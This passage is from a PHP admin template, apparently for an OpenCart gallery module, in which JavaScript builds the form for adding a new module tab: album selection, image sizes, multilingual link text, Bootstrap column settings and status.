  html +='<a onclick="$(this).parent().find(\':checkbox\').prop(\'checked\', true);"><?php echo $text_select_all; ?></a> / <a onclick="$(this).parent().find(\':checkbox\').prop(\'checked\', false);"><?php echo $text_unselect_all; ?></a></div>';
  html +='</div>';

  html +='<div class="form-group s_img1' + module_row + '">';
  html +='<label class="col-sm-2 control-label"><?php echo $entry_show_covers; ?></label>';
  html +='<div class="col-sm-10">';
  html +='<label class="radio-inline">';
  html +='<input type="radio" name="gallery_module[' + module_row + '][show_covers]" value="1" />';
  html +='&nbsp;<?php echo $text_yes; ?>';
  html +='</label>';
  html +='<label class="radio-inline">';
  html +='<input type="radio" name="gallery_module[' + module_row + '][show_covers]" value="0" checked="checked" />';
  html +='&nbsp;<?php echo $text_no; ?>';
  html +='</label>';
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group s_img1' + module_row + '">';
  html +='<label class="col-sm-2 control-label" for="gallery_module[' + module_row + '][cover_image_width]"><?php echo $entry_cover_size; ?></label>';
  html +='<div class="col-sm-10">';
  html +='<div class="row">';
  html +='<div class="col-sm-6">';
  html +='<input type="text" name="gallery_module[' + module_row + '][cover_image_width]" value="228" placeholder="<?php echo $entry_cover_size; ?>" id="gallery_module[' + module_row + '][cover_image_width]" class="form-control" />';
  html +='</div>';
  html +='<div class="col-sm-6">';
  html +='<input type="text" name="gallery_module[' + module_row + '][cover_image_height]" value="228" placeholder="<?php echo $entry_cover_size; ?>" id="gallery_module[' + module_row + '][cover_image_height]" class="form-control" />';
  html +='</div>';
  html +='</div>';
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group s_img1' + module_row + '">';
  html +='<label class="col-sm-2 control-label"><?php echo $entry_show_counter; ?></label>';
  html +='<div class="col-sm-10">';
  html +='<label class="radio-inline">';
  html +='<input type="radio" name="gallery_module[' + module_row + '][show_counter]" value="1" checked="checked" />';
  html +='&nbsp;<?php echo $text_yes; ?>';
  html +='</label>';
  html +='<label class="radio-inline">';
  html +='<input type="radio" name="gallery_module[' + module_row + '][show_counter]" value="0" />';
  html +='&nbsp;<?php echo $text_no; ?>';
  html +='</label>';
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group s_img1' + module_row + '">';
  html +='<label class="col-sm-2 control-label"><?php echo $entry_show_album_galleries_link; ?></label>';
  html +='<div class="col-sm-10">';
  html +='<label class="radio-inline">';
  html +='<input type="radio" name="gallery_module[' + module_row + '][show_album_galleries_link]" value="1" checked="checked" />';
  html +='&nbsp;<?php echo $text_yes; ?>';
  html +='</label>';
  html +='<label class="radio-inline">';
  html +='<input type="radio" name="gallery_module[' + module_row + '][show_album_galleries_link]" value="0" />';
  html +='&nbsp;<?php echo $text_no; ?>';
  html +='</label>';
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group s_img1' + module_row + '">';
  html +='<label class="col-sm-2 control-label" for="gallery_module[' + module_row + '][album_galleries_link_text]"><?php echo $entry_show_album_text; ?></label>';
  html +='<div class="col-sm-10"><div class="row">';
  <?php foreach ($languages as $language): ?>
  html +='<div class="col-sm-6">';
  html +='<div class="input-group">';
  html +='<span class="input-group-addon"><img src="view/image/flags/<?php echo $language['image']; ?>" title="<?php echo $language['name']; ?>" /></span>';
  html +='<input type="text" name="gallery_module[' + module_row + '][album_galleries_link_text][<?php echo $language['language_id']; ?>]" value="<?php echo $text_show_galleries_text; ?>" placeholder="<?php echo $entry_show_album_text; ?>" id="gallery_module[' + module_row + '][album_galleries_link_text][<?php echo $language['language_id']; ?>]" class="form-control" />';
  html +='</div>';
  html +='</div>';
  <?php endforeach ?>
  html +='</div></div>';
  html +='</div>';
      
  html +='<div class="form-group s_img2' + module_row + '">';
  html +='<label class="col-sm-2 control-label" for="input-process-status"><span data-toggle="tooltip" title="<?php echo $entry_photo_album_list_help; ?>"><?php echo $entry_photo_album_list; ?></span></label>';
  html +='<div class="col-sm-10">';
  html +='<div class="well well-sm" style="height: 150px; overflow: auto;">';
  <?php foreach ($albums as $album) { ?>
  html +='<div class="checkbox">';
  html +='<label>';
  html +='<input type="checkbox" name="gallery_module[' + module_row + '][photo_album_list][]" value="<?php echo $album['album_id']; ?>" />';
  html +='&nbsp;<?php echo $album['album_data']['album_name'][$config_admin_language_id]; ?>';
  html +='</label>';
  html +='</div>';
  <?php } ?>
  html +='</div>';
  html +='<a onclick="$(this).parent().find(\':checkbox\').prop(\'checked\', true);"><?php echo $text_select_all; ?></a> / <a onclick="$(this).parent().find(\':checkbox\').prop(\'checked\', false);"><?php echo $text_unselect_all; ?></a></div>';
  html +='</div>';

  html +='<div class="form-group s_img2' + module_row + '">';
  html +='<label class="col-sm-2 control-label"><?php echo $entry_show_album_description; ?></label>';
  html +='<div class="col-sm-10">';
  html +='<label class="radio-inline">';
  html +='<input type="radio" name="gallery_module[' + module_row + '][show_album_description]" value="1" />';
  html +='&nbsp;<?php echo $text_yes; ?>';
  html +='</label>';
  html +='<label class="radio-inline">';
  html +='<input type="radio" name="gallery_module[' + module_row + '][show_album_description]" value="0" checked="checked" />';
  html +='&nbsp;<?php echo $text_no; ?>';
  html +='</label>';
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group s_img2' + module_row + '">';
  html +='<label class="col-sm-2 control-label" for="gallery_module[' + module_row + '][gallery_thumb_image_width]"><?php echo $entry_thumb_size_mod; ?></label>';
  html +='<div class="col-sm-10">';
  html +='<div class="row">';
  html +='<div class="col-sm-6">';
  html +='<input type="text" name="gallery_module[' + module_row + '][gallery_thumb_image_width]" value="228" placeholder="<?php echo $entry_thumb_size_mod; ?>" id="gallery_module[' + module_row + '][gallery_thumb_image_width]" class="form-control" />';
  html +='</div>';
  html +='<div class="col-sm-6">';
  html +='<input type="text" name="gallery_module[' + module_row + '][gallery_thumb_image_height]" value="228" placeholder="<?php echo $entry_thumb_size_mod; ?>" id="gallery_module[' + module_row + '][gallery_thumb_image_height]" class="form-control" />';
  html +='</div>';
  html +='</div>';
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group s_img2' + module_row + '">';
  html +='<label class="col-sm-2 control-label" for="gallery_module[' + module_row + '][gallery_popup_image_width]"><?php echo $entry_popup_size_mod; ?></label>';
  html +='<div class="col-sm-10">';
  html +='<div class="row">';
  html +='<div class="col-sm-6">';
  html +='<input type="text" name="gallery_module[' + module_row + '][gallery_popup_image_width]" value="500" placeholder="<?php echo $entry_popup_size_mod; ?>" id="gallery_module[' + module_row + '][gallery_popup_image_width]" class="form-control" />';
  html +='</div>';
  html +='<div class="col-sm-6">';
  html +='<input type="text" name="gallery_module[' + module_row + '][gallery_popup_image_height]" value="500" placeholder="<?php echo $entry_popup_size_mod; ?>" id="gallery_module[' + module_row + '][gallery_popup_image_height]" class="form-control" />';
  html +='</div>';
  html +='</div>';
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group s_img2' + module_row + '">';
  html +='<label class="col-sm-2 control-label" for="gallery_module[' + module_row + '][photos_limit]"><span data-toggle="tooltip" title="<?php echo $entry_photos_limit_help; ?>"><?php echo $entry_photos_limit; ?></span></label>';
  html +='<div class="col-sm-10">';
  html +='<input type="text" name="gallery_module[' + module_row + '][photos_limit]" value="8" placeholder="<?php echo $entry_photos_limit; ?>" id="gallery_module[' + module_row + '][photos_limit]" class="form-control" />';
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group s_img2' + module_row + '">';
  html +='<label class="col-sm-2 control-label"><span data-toggle="tooltip" title="<?php echo $entry_show_album_link_help; ?>"><?php echo $entry_show_album_link; ?></span></label>';
  html +='<div class="col-sm-10">';
  html +='<label class="radio-inline">';
  html +='<input type="radio" name="gallery_module[' + module_row + '][show_album_link]" value="1" checked="checked" />';
  html +='&nbsp;<?php echo $text_yes; ?>';
  html +='</label>';
  html +='<label class="radio-inline">';
  html +='<input type="radio" name="gallery_module[' + module_row + '][show_album_link]" value="0" />';
  html +='&nbsp;</label>';
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group s_img2' + module_row + '">';
    html +='<label class="col-sm-2 control-label" for="gallery_module[' + module_row + '][album_link_text]"><?php echo $entry_show_album_text; ?></label>';
    html +='<div class="col-sm-10">';
      html +='<div class="row">';
      <?php foreach ($languages as $language): ?>
      html +='<div class="col-sm-6">';
        html +='<div class="input-group">';
          html +='<span class="input-group-addon"><img src="view/image/flags/<?php echo $language['image']; ?>" title="<?php echo $language['name']; ?>" /></span>';
          html +='<input type="text" name="gallery_module[' + module_row + '][album_link_text][<?php echo $language['language_id']; ?>]" value="<?php echo $text_show_album_text; ?>" placeholder="<?php echo $entry_show_album_text; ?>" id="gallery_module[' + module_row + '][album_link_text][<?php echo $language['language_id']; ?>]" class="form-control" />';
        html +='</div>';
      html +='</div>';
      <?php endforeach ?>
      html +='</div>';
    html +='</div>';
  html +='</div>';

  html +='<fieldset><legend><?php echo $text_bootstrap ?></legend>'; 
      
  html +='<div class="form-group ">';
  html +='<label class="col-sm-2 control-label"><span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_xs_help; ?>"><?php echo $entry_number_of_columns_xs; ?></span></label>';
  html +='<div class="col-sm-10">';
  <?php foreach ($entry_number_of_columns_values as $key => $value): ?>
    html +='<label class="radio-inline">';
    <?php if ($key == 1): ?>
      html +='<input type="radio" name="gallery_module[' + module_row + '][number_of_columns_xs]" value="<?php echo $key ?>" checked="checked" />';
      <?php if ($key == 0): ?>
        html +='<span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>';
      <?php else: ?>
        html +='&nbsp;<?php echo $value; ?>';
      <?php endif ?>
    <?php else: ?>
      html +='<input type="radio" name="gallery_module[' + module_row + '][number_of_columns_xs]" value="<?php echo $key ?>" />';
      <?php if ($key == 0): ?>
        html +='<span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>';
      <?php else: ?>
        html +='&nbsp;<?php echo $value; ?>';
      <?php endif ?>
    <?php endif ?>
    html +='</label>';
  <?php endforeach ?>
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group ">';
  html +='<label class="col-sm-2 control-label"><span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_sm_help; ?>"><?php echo $entry_number_of_columns_sm; ?></span></label>';
  html +='<div class="col-sm-10">';
  <?php foreach ($entry_number_of_columns_values as $key => $value): ?>
    html +='<label class="radio-inline">';
    <?php if ($key == 2): ?>
      html +='<input type="radio" name="gallery_module[' + module_row + '][number_of_columns_sm]" value="<?php echo $key ?>" checked="checked" />';
      <?php if ($key == 0): ?>
        html +='<span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>';
      <?php else: ?>
        html +='&nbsp;<?php echo $value; ?>';
      <?php endif ?>
    <?php else: ?>
      html +='<input type="radio" name="gallery_module[' + module_row + '][number_of_columns_sm]" value="<?php echo $key ?>" />';
      <?php if ($key == 0): ?>
        html +='<span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>';
      <?php else: ?>
        html +='&nbsp;<?php echo $value; ?>';
      <?php endif ?>
    <?php endif ?>
    html +='</label>';
  <?php endforeach ?>
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group ">';
  html +='<label class="col-sm-2 control-label"><span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_md_help; ?>"><?php echo $entry_number_of_columns_md; ?></span></label>';
  html +='<div class="col-sm-10">';
  <?php foreach ($entry_number_of_columns_values as $key => $value): ?>
    html +='<label class="radio-inline">';
    <?php if ($key == 4): ?>
      html +='<input type="radio" name="gallery_module[' + module_row + '][number_of_columns_md]" value="<?php echo $key ?>" checked="checked" />';
      <?php if ($key == 0): ?>
        html +='<span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>';
      <?php else: ?>
        html +='&nbsp;<?php echo $value; ?>';
      <?php endif ?>
    <?php else: ?>
      html +='<input type="radio" name="gallery_module[' + module_row + '][number_of_columns_md]" value="<?php echo $key ?>" />';
      <?php if ($key == 0): ?>
        html +='<span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>';
      <?php else: ?>
        html +='&nbsp;<?php echo $value; ?>';
      <?php endif ?>
    <?php endif ?>
    html +='</label>';
  <?php endforeach ?>
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group ">';
  html +='<label class="col-sm-2 control-label"><span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_lg_help; ?>"><?php echo $entry_number_of_columns_lg; ?></span></label>';
  html +='<div class="col-sm-10">';
  <?php foreach ($entry_number_of_columns_values as $key => $value): ?>
    html +='<label class="radio-inline">';
    <?php if ($key == 4): ?>
      html +='<input type="radio" name="gallery_module[' + module_row + '][number_of_columns_lg]" value="<?php echo $key ?>" checked="checked" />';
      <?php if ($key == 0): ?>
        html +='<span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>';
      <?php else: ?>
        html +='&nbsp;<?php echo $value; ?>';
      <?php endif ?>
    <?php else: ?>
      html +='<input type="radio" name="gallery_module[' + module_row + '][number_of_columns_lg]" value="<?php echo $key ?>" />';
      <?php if ($key == 0): ?>
        html +='<span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>';
      <?php else: ?>
        html +='&nbsp;<?php echo $value; ?>';
      <?php endif ?>
    <?php endif ?>
    html +='</label>';
  <?php endforeach ?>
  html +='</div>';
  html +='</div>';

  html +='</fieldset>';

  html +='<div class="form-group ">';
  html +='<label class="col-sm-2 control-label" for="gallery_module_' + module_row + '_status"><?php echo $entry_status; ?></label>';
  html +='<div class="col-sm-10">';
  html +='<select name="gallery_module[' + module_row + '][status]" id="gallery_module_' + module_row + '_status" class="form-control">';
  html +='<option value="1" selected="selected"><?php echo $text_enabled; ?></option>';
  html +='<option value="0"><?php echo $text_disabled; ?></option>';
  html +='</select>';
  html +='</div>';
  html +='</div>';

  html +='</div>';
    
  html +='</div>';
  
  $('#module_wrapper').append(html);
  tab_data = '<a href="#tab_module_' + module_row + '" id="a_tab_module_' + module_row + '" class="tab_btn tab_module_' + module_row + '">';
  tab_data += '<?php echo $text_new_module_name ?> ';
  tab_data += '<i class="fa fa-minus-square fa-fw" onclick="$(\'#tab_module_' + module_row + ', #a_tab_module_' + module_row + '\').remove();$(\'#tabs a.tab_btn:last\').trigger(\'click\'); return false;"></i>';
  tab_data += '</a>';

  $('#add_module_btn').before(tab_data);

  initForm();
  var this_module_row = module_row;
  
  $('.name-changer').on('change, paste, keyup', function(event) {
    event.preventDefault();
    var row_id = $(this).attr('data-id');
    console.log(row_id);
    var remove_btn = "<i class=\"fa fa-minus-square fa-fw\" onclick=\"$('#tab_module_"+ row_id +", #a_tab_module_"+ row_id +"').remove(); $('#tabs a.tab_btn:last').click();return false;\"></i>";
    $('#a_tab_module_' + row_id).html($(this).val()+remove_btn);
  });
  $('#a_tab_module_'+ module_row).trigger('click');
  $('#add_module_btn.selected').removeClass('selected');
  $('.type-changer').on('change', function(){
    var m_row = $(this).attr('data-id');
    var m_val = parseInt($(this).val());
    switch (m_val){
      case 0:
        $('.s_img1'+m_row).show();
        $('.s_img2'+m_row).hide();
      break;
      case 1:
        $('.s_img1'+m_row).hide();
        $('.s_img2'+m_row).show();
      break;
    }
  });
  module_row++;
}
//--></script> 
<!-- add product -->
<?php echo $footer; ?>